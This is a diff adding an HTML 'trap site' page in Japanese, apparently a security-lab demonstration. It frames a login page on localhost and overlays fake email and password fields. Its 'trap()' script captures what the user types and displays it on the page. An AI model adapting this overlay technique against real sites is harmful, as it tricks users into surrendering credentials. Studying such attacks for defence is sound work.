@@ -1,0 +1,44 @@
+<head>
+    <script>
+        function trap(){
+            var email = document.getElementById("email").value;
+            var pass = document.getElementById("passwd").value;
+            var res = "メールアドレス:" + email;
+            res = res + "<br>パスワード:" + pass;
+            document.getElementById("trap").innerHTML = res;
+        }
+    </script>
+    <style>
+        .alp{
+            position: absolute;
+            left: 0%;
+            filter: alpha(opacity=0.0);
+            -moz-opacity: 0.0;
+            opacity: 0.0;
+            z-index: 10;
+        }
+        .loc{
+            position: absolute;
+            top: 0%;
+            left: 0%;
+        }
+        .loc2{
+            position: absolute;
+            top: 92.5px;
+            left: 2.25px;
+        }
+    </style>
+</head>
+<div id="trap">
+<iframe height=300 width=400 src="http://localhost:5000/login" class="loc"></iframe>
+    <div class="alp">
+        <h1>罠サイト</h1>
+    </div>
+    <div class="loc2">
+        <table align="center">
+            <tr><td align="right">メールアドレス</td><td><input type="email" id="email" required></td></tr>
+            <tr><td align="right">パスワード</td><td><input type="password" id="passwd" required></td></tr>
+            <tr><td align="right" colspan="2"><input type="button" value="認証" onclick="trap();"></td></tr>
+        </table>
+    </div>
+</div>
